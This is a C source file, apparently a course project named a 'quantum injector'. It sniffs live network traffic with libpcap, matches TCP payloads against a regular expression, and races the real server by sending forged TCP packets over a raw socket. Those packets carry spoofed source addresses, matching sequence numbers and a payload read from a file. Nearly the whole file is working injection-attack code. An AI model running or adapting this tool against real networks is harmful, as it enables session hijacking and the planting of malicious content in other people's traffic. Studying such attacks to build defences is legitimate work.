#include <pcap.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <assert.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <time.h>
#include <pcre.h>

#define ETHER_ADDR_LEN 6
#define SIZE_ETHERNET 14
#define ETHERTYPE_IPV4 0x0800

typedef enum { false, true } boolean;

unsigned char *spoof_payload = NULL;

char* read_file(const char* filename) {
	char *buffer = 0;
	long length;
	FILE *f = fopen (filename, "rb");
	
	if (f) {
		fseek (f, 0, SEEK_END);
		length = ftell (f);
		fseek (f, 0, SEEK_SET);
		buffer = malloc (length);
		if (buffer)
			fread (buffer, 1, length, f);
		fclose (f);
	} else
		return 0;
	
	return buffer;
}

// define necessary struct for headers
/* Ethernet header */
struct sniff_ethernet
{
	u_char  ether_dhost[ETHER_ADDR_LEN];	/* destination host address */
	u_char  ether_shost[ETHER_ADDR_LEN];	/* source host address */
	u_short ether_type;					 /* IP? ARP? RARP? etc */
};

/* 
    96 bit (12 bytes) pseudo header needed for tcp header checksum calculation 
*/
struct pseudo_header
{
	u_int32_t source_address;
	u_int32_t dest_address;
	u_int8_t placeholder;
	u_int8_t protocol;
	u_int16_t tcp_length;
};

// for generating checksum of packet
unsigned short csum (unsigned short *buf, int nbytes) {
	unsigned long sum = 0;
	
	while (nbytes > 1) {
		sum += *buf++;
		nbytes -= 2;	// one short int has two bytes
	}
	// critical, don't forget to check odd and even here
	if (nbytes == 1)
		sum += *(u_int8_t *)buf;
	
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	return (unsigned short)(~sum);
}

int send_spoof_packet (unsigned long src_ip, u_short src_port, unsigned long dst_ip, u_short dst_port, tcp_seq seq, tcp_seq ack) {
	int raw_fd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
	if (raw_fd < 0) {
		printf("Creating raw socket error, exiting...");
		return 0;
	}
	
	// bind socket to the same interface
	char *opt = "eth0";
	setsockopt(raw_fd, SOL_SOCKET, SO_BINDTODEVICE, opt, 4);
	
	char datagram[8192];
	struct ip *ip_header = (struct ip *)datagram;
	struct tcphdr *tcp_header = (struct tcphdr *)(datagram + sizeof(struct ip));
	char *payload = datagram + sizeof(struct ip) + sizeof(struct tcphdr);
	char *pseudogram;
	struct sockaddr_in sin;
	struct pseudo_header psh;
	
	sin.sin_family = AF_INET;
	sin.sin_port = dst_port;
	sin.sin_addr.s_addr = dst_ip;
	
	memset(datagram, 0, 8192);
	
	memcpy(payload, spoof_payload, strlen(spoof_payload));
	
	/* we'll now fill in the ip/tcp header values, see above for explanations */
	ip_header->ip_hl = sizeof*ip_header >> 2;	/* header length */
	ip_header->ip_v = 4;
	ip_header->ip_tos = 0;	/* could be just 0? */
	ip_header->ip_len = sizeof(struct ip) + sizeof(struct tcphdr) + strlen(spoof_payload);
	ip_header->ip_id = htons (4321);	/* the value doesn't matter here */
	ip_header->ip_off = htons(0);
	ip_header->ip_ttl = 128;
	ip_header->ip_p = 6;	/* 6 means TCP protocol */
	ip_header->ip_sum = 0;	/* set it to 0 before computing the actual checksum later */
	ip_header->ip_src.s_addr = src_ip;
	//ip_header->ip_src.s_addr = inet_addr("8.8.8.8");	/* test */
	ip_header->ip_dst.s_addr = sin.sin_addr.s_addr;
	
	ip_header->ip_sum = csum ((unsigned short *)datagram, 4 * ip_header->ip_hl);
	
	tcp_header->th_sport = src_port;	/* arbitrary port */
	tcp_header->th_dport = dst_port;
	tcp_header->th_seq = seq;	/* seq is previous ack */
	tcp_header->th_ack = ack;	/* ack is previous seq plus tcp payload length */
	tcp_header->th_x2 = 0;
	tcp_header->th_off = 5;		/* first and only tcp segment */
	tcp_header->th_flags = (TH_ACK | TH_PUSH);	/* spoofed ack packet */
	tcp_header->th_win = htonl (65535);	/* maximum allowed window size */
	tcp_header->th_sum = 0;	/* if you set a checksum to zero, your kernel's IP stack should fill in the correct checksum during transmission */
	tcp_header->th_urp = 0;
	
	//Now the TCP checksum
	psh.source_address = ip_header->ip_src.s_addr;
	psh.dest_address = ip_header->ip_dst.s_addr;
	psh.placeholder = 0;
	psh.protocol = ip_header->ip_p;
	psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(payload));
	
	int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(payload);
	pseudogram = malloc(psize);
	
	memcpy(pseudogram, (char*)&psh, sizeof(struct pseudo_header));
	memcpy(pseudogram + sizeof(struct pseudo_header), tcp_header, sizeof(struct tcphdr) + strlen(payload));
	
	tcp_header->th_sum = csum((unsigned short*)pseudogram, psize);
	free(pseudogram);
	
/* finally, it is very advisable to do a IP_HDRINCL call, to make sure
   that the kernel knows the header is included in the data, and doesn't
   insert its own header into the packet before our data */
	
	/* lets do it the ugly way.. */
	int one = 1;
	if (setsockopt(raw_fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
		printf ("Warning: Cannot set HDRINCL!\n");
		return 0;
	}
	
	if (sendto(raw_fd, datagram, ip_header->ip_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
		//printf ("Send spoof packet error\n");
		close(raw_fd);
		return 0;
	} else {
		//printf ("Send spoof packet succeed!\n");
		close(raw_fd);
		return 1;
	}
}

// handle each packet and possibly inject spoof packet
void handle_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
	/* declare pointers to packet headers */
	//printf("Got packet!\n");
	const struct sniff_ethernet *ethernet;
	const struct ip *ip;
	const struct tcphdr *tcp;
	const char *payload;
	
	int size_ip;
	int size_tcp;
	int size_payload;
	
	// extract ethernet header
	ethernet = (struct sniff_ethernet*)(packet);
	
	if (ntohs(ethernet->ether_type) == ETHERTYPE_IPV4) {
		//printf("regexp: %s\n", args);
		printf("IPv4 ");
		// extract ip header
		ip = (struct ip*)(packet + SIZE_ETHERNET);
		size_ip = ip->ip_hl * 4;
		if (size_ip < 20) {
			printf("* Invalid IP header length: %u bytes\n", size_ip);
			return;
		}
		
		// for tcp packet
		if (ip->ip_p == IPPROTO_TCP) {
			printf("TCP ");
			tcp = (struct tcphdr *)(packet + SIZE_ETHERNET + size_ip);
			size_tcp = tcp->th_off * 4;
			if (size_tcp < 20) {
				printf("* Invalid TCP header length: %u bytes\n", size_tcp);
				return;
			}
			printf("%s.%d -> ", inet_ntoa(ip->ip_src), ntohs(tcp->th_sport));
			printf("%s.%d ", inet_ntoa(ip->ip_dst), ntohs(tcp->th_dport));
			printf("len %d ", ntohs(ip->ip_len));
			
			// extract payload
			payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
			size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);
			
			// print payload
			if (size_payload > 0) {
				printf("Payload (%d bytes)  ", size_payload);
				
				if (args != NULL) {
					// find matching
					const char *error;
					int erroffset;
					pcre *re;
					int rc;
					int i;
					int ovector[100];
					
					char *regex = args;
					re = pcre_compile(regex, PCRE_MULTILINE, &error, &erroffset, 0);
					if (!re) {
						printf("pcre_compile failed (offset: %d), %s\n", erroffset, error);
						return;
					}
					
					// search for desired pattern
					if ((rc = pcre_exec(re, 0, payload, size_payload, 0, 0, ovector, sizeof(ovector))) < 0) {
						printf("Pattern not found\n");
						return;
					}
					
					/*
					if (strstr(payload, args) == NULL) {
						printf("Pattern not found\n");
						return;
					}*/
					else {
						// inject packet here
						printf("Found matching, inject packet!\n");
						//int i = send_spoof_packet(ip->ip_dst.s_addr, tcp->th_dport, ip->ip_src.s_addr, tcp->th_sport, (tcp_seq)(ip->ip_len - sizeof(struct ip) - sizeof(struct tcphdr) + 1));
						tcp_seq spoof_ack = (tcp_seq)htonl(ntohl(tcp->th_seq) + size_payload);
						//printf("previous seq: %lu, spoofed ack: %lu\n", (unsigned long)tcp->th_seq, (unsigned long)spoof_ack);
						int i = send_spoof_packet(ip->ip_dst.s_addr, tcp->th_dport, ip->ip_src.s_addr, tcp->th_sport, tcp->th_ack, spoof_ack);
						if (!i) 
							printf("Send spoof packet error!\n");
						return;
					}
				} else {
					// inject packet here if no pattern specified
					printf("Pattern not specified, inject packet!\n");
					//int i = send_spoof_packet(ip->ip_dst.s_addr, tcp->th_dport, ip->ip_src.s_addr, tcp->th_sport, (tcp_seq)(ip->ip_len - sizeof(struct ip) - sizeof(struct tcphdr) + 1));
					tcp_seq spoof_ack = (tcp_seq)htonl(ntohl(tcp->th_seq) + size_payload);
					//printf("previous seq: %lu, spoofed ack: %lu\n", (unsigned long)tcp->th_seq, (unsigned long)spoof_ack);
					int i = send_spoof_packet(ip->ip_dst.s_addr, tcp->th_dport, ip->ip_src.s_addr, tcp->th_sport, tcp->th_ack, spoof_ack);
					if (!i) 
						printf("Send spoof packet error!\n");
					return;
				}
			} else {
				printf("No payload, skip injecting packet\n");
				/*
				printf("No payload, inject packet!\n");
				int i = send_spoof_packet(ip->ip_dst.s_addr, tcp->th_dport, ip->ip_src.s_addr, tcp->th_sport, (tcp_seq)(ip->ip_len - sizeof(struct ip) - sizeof(struct tcphdr) + 1));
				if (!i) 
					printf("Send spoof packet error!\n");
				*/
				return;
			}
		} else {
			printf("NON-TCP packet\n");
			return;
		}
		
	} else {
		printf("NON-IPv4 packet\n");
		return;
	}
}

int main(int argc, char *argv[]) {
	int opt = 0;
	char *interface = NULL;
	char *regexp = NULL;
	char *datafile = NULL;
	char *expression = NULL;
	// this string is used for communication between this
	// program and pcap
	char errbuf[PCAP_ERRBUF_SIZE];
	// this is like file system
	pcap_t *handle;
	// compiled filter
	struct bpf_program filter;
	// The netmask of interface
	bpf_u_int32 mask;
	// The ip address of interface
	bpf_u_int32 net;
	// the struct to store packet header
	struct pcap_pkthdr header;
	// the actual packet
	const u_char *packet;
	// set counter to negative so sniffer will continue working
	int cnt = -1;

	while ((opt = getopt(argc, argv, "i:r:d:")) != -1) {
		switch(opt) {
			case 'i':
				interface = optarg;
				//printf("interface: %s\n", interface);
				break;
			case 'r':
				regexp = optarg;
				//printf("file: %s\n", file);quantumdetect
				break;
			case 'd':
				datafile = optarg;
				//printf("string: %s\n", string);
				break;
			case '?':
				// when user didn't specify argument
				if (optopt == 'i') {
					printf("Please specify interface!\n");
					return 0;
				} else if (optopt == 'r') {
					printf("Please specify regular expression!\n");
					return 0;
				} else if (optopt == 'd') {
					printf("Please specify data file!\n");
					return 0;
				} else {
					printf("Unknown argument!\n");
					return 0;
				}
			default:
				printf("Default case?!\n");
				return 0;
		}
		
	}
	
	// get expression
	if (optind == argc - 1)
		expression = argv[optind];
	else if (optind < argc -1) {
		printf("Redundant arguments. Exiting...\n");
		return 0;
	}
	
	if (datafile == NULL) {
		printf("Please use -d to specify the data file you want to use as the spoofed payload!\n");
		return 0;
	}
	
	if (interface == NULL) {
		interface = pcap_lookupdev(errbuf);
		//interface = NULL;
		if (interface == NULL) {
			printf("Error getting default device! Error message: %s\n\
			Exiting...\n", errbuf);
			return 0;
		}
	}
	
	printf("\n\tInitializing quantum injector using following parameters:\n\
		interface: %s\n\
		regular expression: %s\n\
		data file: %s\n\
		expression: %s\n\n\n", interface, regexp, datafile, expression);
	
	// open interface here
	if (interface != NULL) {
		// Get ip and netmask of sniffing interface or file
		if (pcap_lookupnet(interface, &net, &mask, errbuf) == -1) {
			printf("Error getting ip and mask of the interface! Error message: %s\n", errbuf);
			net = 0;
			mask = 0;
		}
		// Start pcap session
		handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
		if (handle == NULL) {
			printf("Error opening live! Error message: %s\n\
			Existing...\n", errbuf);
			return 0;
		}
	} else {
		printf("Interface not specified when initializing! Existing...\n");
		return 0;
	}
	
	// read payload file
	spoof_payload = read_file(datafile);
	if (!spoof_payload) {
		printf("read data file failed!\n");
		return 0;
	}
	
	// check if link-layer header is ethernet
	if (pcap_datalink(handle) != DLT_EN10MB) {
		printf("Interface %s doesn't using ethernet header! Existing\n", interface);
		return 0;
	}
	
	// compile and apply expression
	if (expression != NULL) {
		// compile filter string
		if (pcap_compile(handle, &filter, expression, 0, net) == -1) {
			printf("Error compiling expression! Error message: %s\n\
			Existing...\n", pcap_geterr(handle));
			return 0;
		}
		// apply compiled filter to session
		if (pcap_setfilter(handle, &filter) == -1) {
			printf("Error applying expression! Error message: %s\n\
			Existing...\n", pcap_geterr(handle));
			return 0;
		}
	}
	
	// now we start sniffing!
	pcap_loop(handle, cnt, handle_packet, regexp);
	
	//pcap_freecode(&filter);
	pcap_close(handle);
	printf("\n\t... ... the end ... ...\n\n");
	return 0;
}